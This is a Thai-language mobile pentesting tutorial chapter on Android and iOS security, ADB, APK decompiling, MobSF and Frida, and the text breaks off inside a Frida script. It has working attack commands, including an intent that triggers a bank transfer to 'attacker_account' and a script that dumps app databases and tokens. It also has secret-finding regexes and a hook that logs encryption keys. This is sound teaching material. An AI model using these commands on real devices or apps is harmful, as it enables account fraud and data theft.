# Part 79: Mobile Security - การทดสอบความปลอดภัยบนมือถือ

← [Part 78: Advanced Exploitation](Part-78-Advanced-Exploitation.md) | [Part 80: IoT Security](Part-80-IoT-Security.md) →

---

## สารบัญ

1. [ภาพรวม Mobile Security](#1-ภาพรวม-mobile-security)
2. [Android Architecture และ Security Model](#2-android-architecture-และ-security-model)
3. [iOS Architecture และ Security Model](#3-ios-architecture-และ-security-model)
4. [OWASP Mobile Top 10](#4-owasp-mobile-top-10)
5. [การตั้งค่า Mobile Pentesting Lab](#5-การตั้งค่า-mobile-pentesting-lab)
6. [Android Debug Bridge (ADB)](#6-android-debug-bridge-adb)
7. [APK Analysis และ Reverse Engineering](#7-apk-analysis-และ-reverse-engineering)
8. [Static Analysis ด้วย MobSF](#8-static-analysis-ด้วย-mobsf)
9. [Dynamic Analysis ด้วย Frida](#9-dynamic-analysis-ด้วย-frida)
10. [SSL Pinning Bypass](#10-ssl-pinning-bypass)
11. [Android Runtime Exploitation](#11-android-runtime-exploitation)
12. [iOS Security Testing](#12-ios-security-testing)
13. [Mobile Network Traffic Analysis](#13-mobile-network-traffic-analysis)
14. [Mobile Malware Analysis](#14-mobile-malware-analysis)
15. [สรุปและ Lab Exercises](#15-สรุปและ-lab-exercises)

---

## 1. ภาพรวม Mobile Security

การทดสอบความปลอดภัยบนอุปกรณ์มือถือเป็นหนึ่งในสาขาที่เติบโตเร็วที่สุดในวงการ Cybersecurity
เนื่องจากผู้ใช้งานทั่วโลกกว่า 6 พันล้านคนใช้ Smartphone และแอปมือถือเก็บข้อมูลสำคัญมากมาย

### 1.1 ทำไม Mobile Security ถึงสำคัญ

```
สถิติสำคัญ:
- แอป Android บน Google Play: 3.5 ล้านแอป
- แอป iOS บน App Store: 2.2 ล้านแอป
- ช่องโหว่ที่พบบ่อย: Insecure Storage, Weak Auth, Insecure Communication
- ข้อมูลที่เสี่ยง: Banking, Healthcare, Personal Data, Corporate Credentials

เวกเตอร์การโจมตี:
1. Malicious Apps - แอปที่มีโค้ดอันตราย
2. Man-in-the-Middle - ดักจับ Network Traffic
3. Reverse Engineering - ถอดรหัสแอปเพื่อหา Hardcoded Secrets
4. Runtime Manipulation - แก้ไขการทำงานขณะ Runtime
5. Physical Access - เข้าถึงข้อมูลจากอุปกรณ์โดยตรง
```

### 1.2 Mobile Pentesting Methodology

```
ขั้นตอน Mobile Pentest:

[1. Reconnaissance]
    ├── App Store Research
    ├── Company Mobile Policy
    ├── Backend API Discovery
    └── Third-party Libraries

[2. Static Analysis]
    ├── APK/IPA Decompilation
    ├── Source Code Review
    ├── Hardcoded Secrets
    └── Permission Analysis

[3. Dynamic Analysis]
    ├── Runtime Behavior
    ├── Network Traffic
    ├── File System Access
    └── Memory Analysis

[4. API Testing]
    ├── Authentication/Authorization
    ├── API Fuzzing
    ├── Business Logic Flaws
    └── Data Exposure

[5. Reporting]
    ├── CVSS Scoring
    ├── PoC Development
    ├── Remediation Guidance
    └── Executive Summary
```

---

## 2. Android Architecture และ Security Model

### 2.1 Android Layer Architecture

```
Android Architecture Stack:

┌─────────────────────────────────────────┐
│           Applications Layer             │
│   (Gmail, Chrome, Banking App, etc.)     │
├─────────────────────────────────────────┤
│         Application Framework           │
│   Activity Manager, Package Manager,    │
│   Content Providers, Location Service   │
├─────────────────────────────────────────┤
│      Android Runtime (ART/Dalvik)       │
│   + Native Libraries (libc, OpenSSL)    │
├─────────────────────────────────────────┤
│           Hardware Abstraction          │
├─────────────────────────────────────────┤
│           Linux Kernel                  │
│   (Process Management, Memory, Drivers) │
└─────────────────────────────────────────┘
```

### 2.2 Android Security Features

```
Android Security Mechanisms:

1. Application Sandbox:
   - แต่ละแอปทำงานใน isolated process
   - UID เฉพาะตัวสำหรับแต่ละแอป
   - ไม่สามารถเข้าถึงข้อมูลแอปอื่นโดยตรง

2. Permission System:
   - Dangerous Permissions ต้องขอจากผู้ใช้
   - Normal Permissions ได้อัตโนมัติ
   - Signature Permissions สำหรับแอปที่ Sign ด้วย Key เดียวกัน

3. SELinux:
   - Mandatory Access Control
   - enforcing mode ใน Android 4.3+
   - ป้องกัน Privilege Escalation

4. Verified Boot:
   - ตรวจสอบ Kernel และ System Image
   - dm-verity สำหรับ System Partition
   - Rollback Protection

5. Keystore:
   - Hardware-backed Key Storage (Android 6+)
   - StrongBox Keymaster (Android 9+)
   - ป้องกัน Key Extraction
```

### 2.3 APK Structure

```
APK File Structure:

app.apk (ZIP archive)
├── AndroidManifest.xml    <- Permissions, Activities, Services
├── classes.dex            <- Compiled Dalvik Bytecode
├── classes2.dex           <- (MultiDex)
├── resources.arsc         <- Compiled Resources
├── res/
│   ├── layout/            <- UI Layouts (XML)
│   ├── drawable/          <- Images
│   └── values/            <- Strings, Colors
├── assets/                <- Raw Asset Files
├── lib/
│   ├── arm64-v8a/         <- Native Libraries (64-bit ARM)
│   ├── armeabi-v7a/       <- Native Libraries (32-bit ARM)
│   └── x86_64/            <- Native Libraries (x86)
└── META-INF/
    ├── MANIFEST.MF
    └── CERT.RSA           <- App Signing Certificate

สิ่งที่ต้องตรวจสอบ:
- AndroidManifest.xml: exported components, permissions, debuggable flag
- classes.dex: hardcoded secrets, weak crypto, insecure APIs
- assets/: configuration files, certificates
- lib/: native code vulnerabilities
- res/values/strings.xml: API keys, secrets
```

---

## 3. iOS Architecture และ Security Model

### 3.1 iOS Security Architecture

```
iOS Security Layers:

┌─────────────────────────────────────────┐
│              Applications               │
├─────────────────────────────────────────┤
│           Cocoa Touch Layer             │
│     UIKit, Foundation, CoreData         │
├─────────────────────────────────────────┤
│              Media Layer                │
│    Core Graphics, AVFoundation          │
├─────────────────────────────────────────┤
│           Core Services Layer           │
│     Core Foundation, Security           │
├─────────────────────────────────────────┤
│              Core OS                    │
│          Darwin (Unix-based)            │
└─────────────────────────────────────────┘

iOS Security Features:
1. Secure Enclave - Hardware security processor
2. Data Protection API - AES-256 encryption per file
3. App Sandbox - Strict file system isolation
4. Code Signing - All executables must be signed
5. Gatekeeper - App Store review process
6. ASLR/PIE - Address Space Layout Randomization
7. Stack Canaries - Buffer overflow protection
8. ARC - Automatic Reference Counting (memory safety)
```

### 3.2 IPA Structure

```
IPA File Structure:

app.ipa (ZIP archive)
└── Payload/
    └── AppName.app/
        ├── AppName              <- Mach-O Binary
        ├── Info.plist           <- App Metadata
        ├── embedded.mobileprovision <- Provisioning Profile
        ├── _CodeSignature/      <- Code Signatures
        │   └── CodeResources
        ├── Frameworks/          <- Embedded Frameworks
        ├── PlugIns/             <- App Extensions
        └── Resources/
            ├── Main.storyboard
            ├── Assets.car
            └── Localizable.strings

สิ่งที่ต้องตรวจสอบ:
- Info.plist: URL schemes, permissions, NSAllowsArbitraryLoads
- Binary: strings, hardcoded secrets, weak crypto
- embedded.mobileprovision: certificate details
- Frameworks: third-party library vulnerabilities
```

---

## 4. OWASP Mobile Top 10

```
OWASP Mobile Top 10 (2024):

M1: Improper Credential Usage
   - Hardcoded credentials
   - Insecure credential storage
   - Weak authentication

M2: Inadequate Supply Chain Security
   - Vulnerable third-party components
   - Malicious libraries
   - Unsigned packages

M3: Insecure Authentication/Authorization
   - Missing authentication
   - Client-side authorization
   - Insecure token handling

M4: Insufficient Input/Output Validation
   - SQL injection in mobile
   - XSS in WebView
   - Path traversal

M5: Insecure Communication
   - Cleartext HTTP
   - SSL pinning not implemented
   - Weak TLS configuration

M6: Inadequate Privacy Controls
   - Excessive permissions
   - PII in logs
   - Data leakage

M7: Insufficient Binary Protections
   - No obfuscation
   - Debuggable apps
   - No root/jailbreak detection

M8: Security Misconfiguration
   - Default credentials
   - Unnecessary features enabled
   - Exposed debug endpoints

M9: Insecure Data Storage
   - Unencrypted SQLite
   - World-readable files
   - Sensitive data in logs

M10: Insufficient Cryptography
   - Weak algorithms (MD5, DES)
   - Hardcoded keys
   - ECB mode encryption
```

---

## 5. การตั้งค่า Mobile Pentesting Lab

### 5.1 ติดตั้ง Tools บน Kali

```bash
#!/bin/bash
# mobile_pentest_setup.sh

# ติดตั้ง ADB และ Android Tools
apt-get update
apt-get install -y adb android-tools-adb \
    apktool jadx dex2jar \
    python3-pip openjdk-11-jdk

# ติดตั้ง MobSF (Mobile Security Framework)
pip3 install mobsf
# หรือใช้ Docker
docker pull opensecurity/mobile-security-framework-mobsf:latest
docker run -it --rm -p 8000:8000 \
    opensecurity/mobile-security-framework-mobsf:latest

# ติดตั้ง Frida (Dynamic Instrumentation)
pip3 install frida-tools objection

# ติดตั้ง Ghidra (สำหรับ Native Library)
# Download จาก https://ghidra-sre.org/

# ติดตั้ง apkleaks
pip3 install apkleaks

# ติดตั้ง apksigner และ zipalign
apt-get install -y apksigner

# ติดตั้ง drozer
pip3 install drozer

# ติดตั้ง jadx-gui
wget https://github.com/skylot/jadx/releases/latest/download/jadx-1.5.0.zip
unzip jadx-1.5.0.zip -d /opt/jadx
ln -s /opt/jadx/bin/jadx /usr/local/bin/jadx
ln -s /opt/jadx/bin/jadx-gui /usr/local/bin/jadx-gui

echo "[+] Mobile Pentest Tools installed!"
```

### 5.2 ตั้งค่า Android Emulator

```bash
# ดาวน์โหลด Android Studio หรือใช้ command-line tools
# Download SDK command-line tools
wget https://dl.google.com/android/repository/commandlinetools-linux-latest.zip
unzip commandlinetools-linux-latest.zip -d ~/android-sdk

# ตั้งค่า PATH
export ANDROID_HOME=~/android-sdk
export PATH=$PATH:$ANDROID_HOME/cmdline-tools/bin:$ANDROID_HOME/platform-tools

# ยอมรับ licenses
sdkmanager --licenses

# ติดตั้ง emulator
sdkmanager "emulator" "platform-tools"
sdkmanager "system-images;android-30;google_apis;x86_64"

# สร้าง AVD (Android Virtual Device)
avdmanager create avd -n "pentest_device" \
    -k "system-images;android-30;google_apis;x86_64" \
    --device "pixel_4"

# เปิด emulator พร้อม root access
emulator -avd pentest_device -writable-system -no-snapshot &

# รอ emulator พร้อม
adb wait-for-device
adb root  # ให้สิทธิ์ root
adb remount  # remount filesystem writable

echo "[+] Android Emulator ready for pentesting!"
```

### 5.3 ตั้งค่า BurpSuite สำหรับ Mobile

```bash
# ขั้นตอนตั้งค่า Proxy สำหรับ Android

# 1. BurpSuite: Proxy > Options > Add listener
#    - Bind to port: 8080
#    - Bind to address: All interfaces

# 2. Export BurpSuite CA Certificate
# Proxy > Options > CA Certificate > Export > DER format
# บันทึกเป็น burp_ca.der

# 3. แปลง DER เป็น PEM
openssl x509 -inform DER -in burp_ca.der -out burp_ca.pem

# 4. Android 7+ ต้องการ System Certificate
# แปลง PEM ให้ Android ยอมรับ
hash=$(openssl x509 -inform PEM -subject_hash_old -in burp_ca.pem | head -1)
cp burp_ca.pem ${hash}.0

# 5. Push to system trusted certs (requires root)
adb push ${hash}.0 /sdcard/
adb shell "su -c 'cp /sdcard/${hash}.0 /system/etc/security/cacerts/'"
adb shell "su -c 'chmod 644 /system/etc/security/cacerts/${hash}.0'"

# 6. ตั้งค่า Proxy บน Android
adb shell settings put global http_proxy "$(hostname -I | awk '{print $1}'):8080"

# ยืนยันการตั้งค่า
adb shell settings get global http_proxy

# 7. ทดสอบ
adb shell curl -k https://example.com
```

---

## 6. Android Debug Bridge (ADB)

### 6.1 คำสั่ง ADB พื้นฐาน

```bash
# ──────────────────────────────────────────
# ADB CONNECTION MANAGEMENT
# ──────────────────────────────────────────

# แสดงอุปกรณ์ที่เชื่อมต่อ
adb devices
# Output:
# List of devices attached
# emulator-5554   device
# ABC123456       device

# เชื่อมต่อผ่าน TCP/IP (WiFi ADB)
adb tcpip 5555
adb connect 192.168.1.100:5555

# ตัดการเชื่อมต่อ
adb disconnect 192.168.1.100:5555

# ──────────────────────────────────────────
# SHELL ACCESS
# ──────────────────────────────────────────

# เข้า shell
adb shell

# รันคำสั่งโดยตรง
adb shell ls /data/data/
adb shell pm list packages
adb shell pm list packages | grep bank  # ค้นหาแอป Banking

# Root shell
adb shell su -c "id"

# ──────────────────────────────────────────
# FILE OPERATIONS
# ──────────────────────────────────────────

# ดึงไฟล์จากอุปกรณ์
adb pull /sdcard/DCIM/photo.jpg .
adb pull /data/data/com.example.app/databases/users.db .

# ส่งไฟล์ไปอุปกรณ์
adb push exploit.apk /sdcard/
adb push frida-server /data/local/tmp/

# ──────────────────────────────────────────
# APP MANAGEMENT
# ──────────────────────────────────────────

# ติดตั้งแอป
adb install -r app.apk
adb install -t app-debug.apk  # ติดตั้ง test APK

# ถอนการติดตั้ง
adb uninstall com.example.app

# ดู app data directory
adb shell ls /data/data/com.example.app/

# backup แอป (ไม่ require root)
adb backup -noapk com.example.app -f app_backup.ab

# ──────────────────────────────────────────
# LOGCAT
# ──────────────────────────────────────────

# ดู logs ทั้งหมด
adb logcat

# filter ตาม tag
adb logcat -s "MyApp"

# filter ตาม level
adb logcat *:E  # Error only
adb logcat *:W  # Warning and above

# filter ตาม package
adb logcat | grep com.example.app

# บันทึก log ไปไฟล์
adb logcat -d > device.log

# ──────────────────────────────────────────
# CONTENT PROVIDERS
# ──────────────────────────────────────────

# Query content provider
adb shell content query --uri content://com.example.provider/users

# Insert data
adb shell content insert --uri content://com.example.provider/users \
    --bind name:s:hacker --bind email:s:hack@evil.com

# ──────────────────────────────────────────
# ACTIVITY/INTENT TESTING
# ──────────────────────────────────────────

# เปิด Activity โดยตรง
adb shell am start -n com.example.app/.MainActivity

# เปิด Activity ที่ควรจะต้อง auth
adb shell am start -n com.example.app/.AdminActivity

# ส่ง Intent พร้อม data
adb shell am start \
    -a android.intent.action.VIEW \
    -d "example://admin?bypass=true" \
    com.example.app

# เปิด exported activity (ช่องโหว่ M3)
adb shell am start -n com.victim.bank/.TransferActivity \
    --es "amount" "1000000" \
    --es "account" "attacker_account"
```

### 6.2 Data Extraction

```bash
#!/bin/bash
# android_data_extract.sh - สคริปต์ดึงข้อมูลจาก Android

PACKAGE="com.example.targetapp"
OUTPUT_DIR="./extracted_${PACKAGE}"

mkdir -p "$OUTPUT_DIR"

echo "[+] Starting data extraction for: $PACKAGE"

# ──────────────────────────────────────────
# ดึง Shared Preferences
# ──────────────────────────────────────────
echo "[*] Extracting Shared Preferences..."
adb shell su -c "cat /data/data/${PACKAGE}/shared_prefs/*.xml" \
    > "$OUTPUT_DIR/shared_prefs.xml" 2>/dev/null

# ──────────────────────────────────────────
# ดึง Databases
# ──────────────────────────────────────────
echo "[*] Extracting Databases..."
adb shell su -c "ls /data/data/${PACKAGE}/databases/" 2>/dev/null | \
while read db; do
    adb shell su -c "cat /data/data/${PACKAGE}/databases/${db}" > \
        "$OUTPUT_DIR/${db}" 2>/dev/null
    echo "    [+] Pulled: $db"
done

# ──────────────────────────────────────────
# ดึงไฟล์ทั้งหมดใน data directory
# ──────────────────────────────────────────
echo "[*] Extracting all app files..."
adb pull "/data/data/${PACKAGE}/" "$OUTPUT_DIR/appdata/" 2>/dev/null

# ──────────────────────────────────────────
# ตรวจสอบ SQLite databases
# ──────────────────────────────────────────
echo "[*] Analyzing SQLite databases..."
find "$OUTPUT_DIR" -name "*.db" | while read dbfile; do
    echo "  Database: $dbfile"
    sqlite3 "$dbfile" ".tables" 2>/dev/null | while read table; do
        echo "    Table: $table"
        sqlite3 "$dbfile" "SELECT * FROM $table LIMIT 5;" 2>/dev/null
    done
done

# ──────────────────────────────────────────
# ค้นหา secrets ใน extracted files
# ──────────────────────────────────────────
echo "[*] Searching for secrets..."
grep -rn -E '(password|token|key|secret|api_key|auth)' \
    "$OUTPUT_DIR/" --include="*.xml" --include="*.json" \
    --include="*.txt" -i 2>/dev/null

echo "[+] Extraction complete! Results in: $OUTPUT_DIR"
```

---

## 7. APK Analysis และ Reverse Engineering

### 7.1 Static Analysis ด้วย apktool และ jadx

```bash
# ──────────────────────────────────────────
# DECOMPILE APK
# ──────────────────────────────────────────

# ถอดรหัส APK ด้วย apktool
apktool d target.apk -o decompiled/

# ผลลัพธ์:
# decompiled/
# ├── AndroidManifest.xml
# ├── apktool.yml
# ├── res/
# └── smali/  <- Dalvik bytecode (Smali assembly)

# Decompile เป็น Java ด้วย jadx
jadx target.apk -d java_source/

# jadx-gui (GUI version)
jadx-gui target.apk

# ──────────────────────────────────────────
# ตรวจสอบ AndroidManifest.xml
# ──────────────────────────────────────────

cat decompiled/AndroidManifest.xml

# สิ่งที่ต้องตรวจสอบ:
# 1. android:debuggable="true" - แอปสามารถ debug ได้
# 2. android:allowBackup="true" - อนุญาตให้ backup ข้อมูล
# 3. android:exported="true" - Component เข้าถึงจากภายนอกได้
# 4. <uses-permission> - permissions ที่แอปขอ
# 5. <provider android:exported="true"> - Content Provider ที่ expose

# ──────────────────────────────────────────
# ค้นหา Hardcoded Secrets
# ──────────────────────────────────────────

# ค้นหาด้วย grep
grep -rn "api_key\|apikey\|API_KEY" java_source/ -i
grep -rn "password\|passwd\|pwd" java_source/ -i
grep -rn "secret\|token" java_source/ -i
grep -rn "firebase\|amazonaws\|googleapis" java_source/ -i

# ค้นหา IP addresses
grep -rn -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' java_source/

# ค้นหา URL endpoints
grep -rn -E 'https?://[^ "]+' java_source/

# ──────────────────────────────────────────
# ใช้ apkleaks
# ──────────────────────────────────────────

apkleaks -f target.apk -o secrets_report.json
apkleaks -f target.apk --json  # JSON output

# ──────────────────────────────────────────
# ตรวจสอบ Cryptography
# ──────────────────────────────────────────

# ค้นหา weak crypto
grep -rn "DES\|MD5\|SHA1\|RC4\|ECB" java_source/ -i
grep -rn "new SecretKeySpec\|IvParameterSpec" java_source/
grep -rn "AES/ECB\|DES/CBC" java_source/

# ตัวอย่าง vulnerable code ที่พบบ่อย:
# AES with hardcoded key
# SecretKeySpec key = new SecretKeySpec("hardcoded_key_123".getBytes(), "AES");
# Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");  // ECB = weak!
```

### 7.2 Python Script สำหรับ APK Analysis

```python
#!/usr/bin/env python3
# apk_analyzer.py - Automated APK Security Analysis

import subprocess
import os
import re
import json
import zipfile
from pathlib import Path
from typing import List, Dict, Tuple

class APKAnalyzer:
    """Automated APK Security Analyzer"""
    
    DANGEROUS_PERMISSIONS = [
        'READ_SMS', 'SEND_SMS', 'READ_CONTACTS', 'READ_CALL_LOG',
        'ACCESS_FINE_LOCATION', 'RECORD_AUDIO', 'CAMERA',
        'READ_EXTERNAL_STORAGE', 'WRITE_EXTERNAL_STORAGE',
        'PROCESS_OUTGOING_CALLS', 'READ_PHONE_STATE'
    ]
    
    SECRET_PATTERNS = [
        (r'(?i)(api[_-]?key|apikey)["\s]*[=:]["\s]*([A-Za-z0-9\-_]{20,})', 'API Key'),
        (r'(?i)(password|passwd|pwd)["\s]*[=:]["\s]*["\']([^"\'])+["\']', 'Password'),
        (r'(?i)(secret|token)["\s]*[=:]["\s]*["\']([^"\']){10,}["\']', 'Secret/Token'),
        (r'AIza[0-9A-Za-z\-_]{35}', 'Google API Key'),
        (r'AAAA[A-Za-z0-9_\-]{7}:[A-Za-z0-9_\-]{140}', 'Firebase Cloud Messaging Key'),
        (r'(?i)aws_access_key_id["\s]*=\s*([A-Z0-9]{20})', 'AWS Access Key'),
        (r'(?i)aws_secret_access_key["\s]*=\s*([A-Za-z0-9/+=]{40})', 'AWS Secret Key'),
    ]
    
    def __init__(self, apk_path: str):
        self.apk_path = apk_path
        self.app_name = Path(apk_path).stem
        self.output_dir = f"analysis_{self.app_name}"
        self.findings = []
        os.makedirs(self.output_dir, exist_ok=True)
    
    def decompile(self) -> bool:
        """Decompile APK using jadx"""
        print(f"[*] Decompiling {self.apk_path}...")
        result = subprocess.run(
            ['jadx', self.apk_path, '-d', f"{self.output_dir}/java"],
            capture_output=True, text=True
        )
        return result.returncode == 0
    
    def extract_manifest(self) -> Dict:
        """Extract and parse AndroidManifest.xml"""
        manifest_path = f"{self.output_dir}/java/resources/AndroidManifest.xml"
        if not os.path.exists(manifest_path):
            # Try direct extraction from APK
            with zipfile.ZipFile(self.apk_path, 'r') as z:
                z.extract('AndroidManifest.xml', self.output_dir)
            manifest_path = f"{self.output_dir}/AndroidManifest.xml"
        
        with open(manifest_path, 'r', errors='ignore') as f:
            content = f.read()
        
        manifest_info = {
            'debuggable': 'android:debuggable="true"' in content,
            'allowBackup': 'android:allowBackup="true"' in content,
            'permissions': re.findall(r'android.permission.([A-Z_]+)', content),
            'exported_activities': re.findall(
                r'<activity[^>]*android:exported="true"[^>]*android:name="([^"]+)"',
                content
            ),
            'exported_providers': re.findall(
                r'<provider[^>]*android:exported="true"[^>]*android:name="([^"]+)"',
                content
            ),
            'deep_links': re.findall(r'android:scheme="([^"]+)"', content),
        }
        
        return manifest_info
    
    def find_secrets(self) -> List[Dict]:
        """Search for hardcoded secrets in decompiled code"""
        secrets = []
        java_dir = f"{self.output_dir}/java"
        
        if not os.path.exists(java_dir):
            return secrets
        
        for root, _, files in os.walk(java_dir):
            for filename in files:
                if filename.endswith(('.java', '.xml', '.json', '.properties')):
                    filepath = os.path.join(root, filename)
                    try:
                        with open(filepath, 'r', errors='ignore') as f:
                            content = f.read()
                        
                        for pattern, secret_type in self.SECRET_PATTERNS:
                            matches = re.findall(pattern, content)
                            for match in matches:
                                secrets.append({
                                    'type': secret_type,
                                    'file': filepath.replace(self.output_dir, ''),
                                    'match': match if isinstance(match, str) else match[0]
                                })
                    except Exception:
                        pass
        
        return secrets
    
    def check_network_security(self) -> List[str]:
        """Check network security configuration"""
        issues = []
        java_dir = f"{self.output_dir}/java"
        
        # ค้นหา HTTP URLs (not HTTPS)
        for root, _, files in os.walk(java_dir):
            for filename in files:
                if filename.endswith('.java'):
                    filepath = os.path.join(root, filename)
                    try:
                        with open(filepath, 'r', errors='ignore') as f:
                            content = f.read()
                        
                        http_urls = re.findall(r'http://[^"\s]+', content)
                        for url in http_urls:
                            if 'localhost' not in url and '127.0.0.1' not in url:
                                issues.append(f"HTTP URL in {filename}: {url}")
                        
                        # ตรวจสอบ SSL verification bypass
                        ssl_bypass = [
                            'TrustAllX509TrustManager',
                            'getInsecure',
                            'ALLOW_ALL_HOSTNAME_VERIFIER',
                            'setHostnameVerifier',
                        ]
                        for bypass in ssl_bypass:
                            if bypass in content:
                                issues.append(f"SSL bypass in {filename}: {bypass}")
                    except Exception:
                        pass
        
        return issues
    
    def analyze(self) -> Dict:
        """Run full analysis"""
        print(f"\n{'='*60}")
        print(f"APK Security Analysis: {self.app_name}")
        print('='*60)
        
        # Decompile
        self.decompile()
        
        # Manifest Analysis
        print("\n[1] Manifest Analysis")
        manifest = self.extract_manifest()
        
        if manifest['debuggable']:
            print("  [!] CRITICAL: App is debuggable!")
            self.findings.append({'severity': 'CRITICAL', 'type': 'Debuggable App'})
        
        if manifest['allowBackup']:
            print("  [!] HIGH: Backup enabled - data can be extracted")
            self.findings.append({'severity': 'HIGH', 'type': 'Backup Enabled'})
        
        dangerous_perms = [p for p in manifest['permissions'] 
                          if p in self.DANGEROUS_PERMISSIONS]
        if dangerous_perms:
            print(f"  [!] INFO: Dangerous permissions: {', '.join(dangerous_perms)}")
        
        if manifest['exported_activities']:
            print(f"  [!] HIGH: Exported activities: {manifest['exported_activities']}")
        
        # Secrets
        print("\n[2] Hardcoded Secrets")
        secrets = self.find_secrets()
        for secret in secrets[:10]:  # แสดงแค่ 10 อัน
            print(f"  [!] {secret['type']}: {secret['match'][:50]}...")
            self.findings.append({'severity': 'CRITICAL', 'type': 'Hardcoded Secret', **secret})
        
        # Network Security
        print("\n[3] Network Security")
        network_issues = self.check_network_security()
        for issue in network_issues[:10]:
            print(f"  [!] {issue}")
        
        # Summary
        report = {
            'app': self.app_name,
            'manifest': manifest,
            'secrets_found': len(secrets),
            'network_issues': len(network_issues),
            'findings': self.findings,
            'risk_score': self._calculate_risk()
        }
        
        # บันทึก report
        report_path = f"{self.output_dir}/report.json"
        with open(report_path, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n[+] Report saved to: {report_path}")
        print(f"[+] Risk Score: {report['risk_score']}/100")
        
        return report
    
    def _calculate_risk(self) -> int:
        """คำนวณ Risk Score"""
        score = 0
        for finding in self.findings:
            if finding['severity'] == 'CRITICAL':
                score += 25
            elif finding['severity'] == 'HIGH':
                score += 15
            elif finding['severity'] == 'MEDIUM':
                score += 8
            elif finding['severity'] == 'LOW':
                score += 3
        return min(100, score)


if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <apk_file>")
        sys.exit(1)
    
    analyzer = APKAnalyzer(sys.argv[1])
    report = analyzer.analyze()
```

---

## 8. Static Analysis ด้วย MobSF

### 8.1 ใช้ MobSF API

```python
#!/usr/bin/env python3
# mobsf_client.py - MobSF API Client

import requests
import json
import os
from pathlib import Path

class MobSFClient:
    """Client สำหรับ Mobile Security Framework (MobSF) API"""
    
    def __init__(self, server: str = "http://localhost:8000", 
                 api_key: str = ""):
        self.server = server
        self.api_key = api_key
        self.headers = {'Authorization': api_key}
    
    def upload(self, file_path: str) -> Dict:
        """Upload APK/IPA สำหรับ analysis"""
        print(f"[*] Uploading {file_path}...")
        with open(file_path, 'rb') as f:
            files = {'file': (Path(file_path).name, f, 'application/octet-stream')}
            response = requests.post(
                f"{self.server}/api/v1/upload",
                files=files,
                headers=self.headers
            )
        return response.json()
    
    def scan(self, file_hash: str) -> Dict:
        """เริ่ม scan"""
        data = {'hash': file_hash}
        response = requests.post(
            f"{self.server}/api/v1/scan",
            data=data,
            headers=self.headers
        )
        return response.json()
    
    def report_json(self, file_hash: str) -> Dict:
        """ดึง JSON report"""
        data = {'hash': file_hash}
        response = requests.post(
            f"{self.server}/api/v1/report_json",
            data=data,
            headers=self.headers
        )
        return response.json()
    
    def get_scorecard(self, file_hash: str) -> Dict:
        """ดู security scorecard"""
        response = requests.get(
            f"{self.server}/api/v1/scorecard",
            params={'hash': file_hash},
            headers=self.headers
        )
        return response.json()
    
    def suppress_issue(self, file_hash: str, finding_type: str, 
                      description: str) -> Dict:
        """Suppress false positive"""
        data = {
            'hash': file_hash,
            'type': finding_type,
            'description': description
        }
        response = requests.post(
            f"{self.server}/api/v1/suppress_by_rule",
            data=data,
            headers=self.headers
        )
        return response.json()
    
    def analyze_apk(self, apk_path: str) -> Dict:
        """Full analysis workflow"""
        # Upload
        upload_result = self.upload(apk_path)
        file_hash = upload_result.get('hash')
        print(f"[+] Uploaded. Hash: {file_hash}")
        
        # Scan
        print("[*] Running scan...")
        scan_result = self.scan(file_hash)
        
        # Get Report
        report = self.report_json(file_hash)
        
        # แสดงผลสรุป
        print("\n" + "="*60)
        print("MobSF Analysis Report")
        print("="*60)
        
        # Security Score
        scorecard = self.get_scorecard(file_hash)
        print(f"\nSecurity Score: {scorecard.get('security_score', 'N/A')}/100")
        
        # Critical Issues
        manifest_findings = report.get('manifest_analysis', {}).get('manifest_findings', [])
        print(f"\nManifest Issues: {len(manifest_findings)}")
        for finding in manifest_findings[:5]:
            print(f"  [{finding.get('severity', 'INFO')}] {finding.get('title', '')}")
        
        # Certificate Info
        cert = report.get('certificate_analysis', {})
        print(f"\nCertificate: {cert.get('certificate_info', 'N/A')}")
        
        # Hardcoded Secrets
        secrets = report.get('secrets', [])
        if secrets:
            print(f"\n[!] Hardcoded Secrets Found: {len(secrets)}")
            for secret in secrets[:5]:
                print(f"  Type: {secret.get('metadata', {}).get('match_str', '')}")
        
        return report


# ตัวอย่างการใช้งาน
if __name__ == '__main__':
    # เริ่ม MobSF ด้วย Docker:
    # docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf
    
    client = MobSFClient(
        server="http://localhost:8000",
        api_key="your_api_key_here"  # ดูจาก MobSF Settings
    )
    
    report = client.analyze_apk("target_app.apk")
    
    # บันทึก report
    with open('mobsf_report.json', 'w') as f:
        json.dump(report, f, indent=2)
    print("\n[+] Full report saved to mobsf_report.json")
```

---

## 9. Dynamic Analysis ด้วย Frida

### 9.1 ติดตั้งและตั้งค่า Frida

```bash
# ──────────────────────────────────────────
# ติดตั้ง Frida บน Kali
# ──────────────────────────────────────────
pip3 install frida-tools

# ตรวจสอบ version
frida --version

# ──────────────────────────────────────────
# ติดตั้ง frida-server บน Android
# ──────────────────────────────────────────

# ดู architecture ของ device
adb shell getprop ro.product.cpu.abi
# Output: arm64-v8a

# Download frida-server สำหรับ architecture นั้น
# https://github.com/frida/frida/releases
FRIDA_VERSION=$(frida --version)
wget "https://github.com/frida/frida/releases/download/${FRIDA_VERSION}/frida-server-${FRIDA_VERSION}-android-arm64.xz"
xz -d frida-server-*.xz

# Push และ run frida-server
adb push frida-server-*-android-arm64 /data/local/tmp/frida-server
adb shell chmod 755 /data/local/tmp/frida-server
adb shell su -c '/data/local/tmp/frida-server &'

# ตรวจสอบว่า frida-server ทำงาน
frida-ps -U  # -U = USB device
# Output: แสดงรายการ processes ที่ทำงานอยู่

# ──────────────────────────────────────────
# Frida basic usage
# ──────────────────────────────────────────

# Attach to running app
frida -U com.example.app

# Spawn app with script
frida -U -l script.js -f com.example.app

# Attach แบบ no-pause
frida -U -l script.js --no-pause com.example.app
```

### 9.2 Frida Scripts

```javascript
// frida_hooks.js - Frida Scripts สำหรับ Mobile Pentesting

// ──────────────────────────────────────────
// 1. HOOK ENCRYPTION FUNCTIONS
// ──────────────────────────────────────────

Java.perform(function() {
    var Cipher = Java.use('javax.crypto.Cipher');
    
    // Hook การ init ของ Cipher
    Cipher.init.overload('int', 'java.security.Key').implementation = function(mode, key) {
        console.log('[*] Cipher.init called');
        console.log('    Mode:', mode == 1 ? 'ENCRYPT' : 'DECRYPT');
        console.log('    Algorithm:', this.getAlgorithm());
        console.log('    Key:', bytesToHex(key.getEncoded()));
        return this.init(mode, key);
    };
    
